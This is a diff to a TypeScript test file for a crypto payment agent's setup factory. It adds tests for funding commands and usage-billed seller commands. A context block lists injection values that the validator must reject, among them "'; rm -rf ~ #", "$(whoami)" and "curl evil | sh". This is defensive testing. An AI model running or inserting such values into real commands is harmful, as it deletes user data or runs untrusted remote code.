@@ -1,7 +1,7 @@
 import { describe, expect, it } from "vitest";
 import { formatUsdc6 } from "../../accounting/src/index.js";
 import { parsePolicyString } from "../../policy/src/index.js";
-import { hostOf, inWords, policyString, PRESETS, problems, steps, type FactoryInput } from "../src/factory-config.js";
+import { afterInit, hostOf, inWords, policyString, PRESETS, problems, sellCommand, sellInWords, sellNextSteps, sellProblems, steps, type FactoryInput } from "../src/factory-config.js";
 
 const base: FactoryInput = { client: "claude-desktop", network: "arc", daily: "5", perSeller: "0.5", perPayment: "0.05", perMinute: 60, allow: [], keyFile: "/Users/you/.cra-agent/agent.key" };
 
@@ -84,5 +84,40 @@ describe("the command that starts selling", () => {
     for (const bad of [{ target: "https://a.com/'; rm -rf ~ #" }, { target: "https://a.com/$(whoami)" }, { name: "x'; curl evil | sh #" }, { name: "`id`" }, { free: ["/ok", "/a b"] }, { free: ["health"] }, { payTo: "0x123" }, { payToSolana: "0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74" }, { lightningFile: "nostr+walletconnect://abc?secret=1" }, { lightningFile: "/a b" }, { lightningFile: "/x'; rm -rf ~ #" }, { lightningFile: "~/nwc" }, { lightningFile: "nwc-receive" }, { price: "free" }, { publicUrl: "http://pay.example.com" }]) {
       expect(sellProblems({ ...sell, ...bad }).length, JSON.stringify(bad)).toBeGreaterThan(0);
     }
+  });
+});
+
+describe("money from where it is, and prices by use", () => {
+  it("funds the agent from Base or Solana with the fund command, checked first, and never touches a key", () => {
+    const fromBase = steps({ ...base, fundFrom: "base" }).map((x) => x.code).join("\n");
+    expect(fromBase).toContain("cra-agent fund 1 --from base --dry-run");
+    expect(fromBase).toMatch(/cra-agent fund 1 --from base$/m);
+    expect(fromBase).not.toContain("cra-agent deposit");
+    const fromSolana = steps({ ...base, fundFrom: "solana" }).map((x) => x.code).join("\n");
+    expect(fromSolana).toContain("cra-agent fund 1 --from solana --solana-key-file /full/path/to/solana.json --dry-run");
+    for (const all of [fromBase, fromSolana]) expect(all).not.toMatch(/CRA_PRIVATE_KEY|0x[0-9a-fA-F]{64}|\[\d+(,\s*\d+){20,}\]/);
+    expect(steps(base).map((x) => x.code).join("\n")).toContain("cra-agent deposit 1");
+    expect(afterInit({ ...base, fundFrom: "base" })).toMatch(/USDC on Base.*ETH on Base/);
+    expect(afterInit(base)).toMatch(/USDC on Arc/);
+  });
+
+  it("sells by use on Arc with our facilitator, and tells the API how to say what a call cost", () => {
+    const upto = { target: "https://api.example.com", payTo: "0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74", payToSolana: "", lightningFile: "", lightningFacilitator: false, browserWallets: false, price: "0.10", name: "Renders", free: [], network: "arc" as const, publicUrl: "", upto: true };
+    expect(sellProblems(upto)).toEqual([]);
+    expect(sellCommand(upto).code).toBe("npx -y @cra-agent/seller --target 'https://api.example.com' --pay-to 0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74 --price 0.10 --name 'Renders' --upto --facilitator cra");
+    expect(sellInWords(upto)).toMatch(/up to \$0\.10.*X-Charge-USD/);
+    const next = sellNextSteps(upto);
+    expect(next.map((x) => x.title)).toEqual(expect.arrayContaining(["Have your API say what each call cost", "Register the wallet that gets paid", "See what you earned"]));
+    expect(next.find((x) => x.title === "See what you earned")!.code).toBe("https://explorer.arc.io/address/0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74");
+    expect(sellProblems({ ...upto, payToSolana: "CjNFTjvBhbJJd2B5ePPMHRLx1ELZpa8dwQgGL727eKww" })).toEqual([expect.stringMatching(/Arc only/)]);
+    expect(sellProblems({ ...upto, lightningFile: "/home/me/.secrets/nwc" })).toEqual([expect.stringMatching(/Arc only/)]);
+  });
+
+  it("writes an upto command the real cra-agent-sell parser reads as billed by use", async () => {
+    const { parseSellArgs } = await import("../../seller/src/sell-args.js");
+    const upto = { target: "https://api.example.com", payTo: "0x33b37c6d7a98b58da3Ccb3F36A4b578053d0Ea74", payToSolana: "", lightningFile: "", lightningFacilitator: false, browserWallets: false, price: "0.10", name: "", free: ["/health"], network: "arc" as const, publicUrl: "", upto: true };
+    const line = sellCommand(upto).code;
+    const argv = [...line.slice("npx -y @cra-agent/seller ".length).matchAll(/'([^']*)'|(\S+)/g)].map((m) => m[1] ?? m[2]!);
+    expect(parseSellArgs(argv)).toMatchObject({ upto: true, facilitatorUrl: "https://api.cra-agent.tech/facilitator", routes: [{ pattern: "/*", price: "$0.10" }], free: ["/health"] });
   });
 });
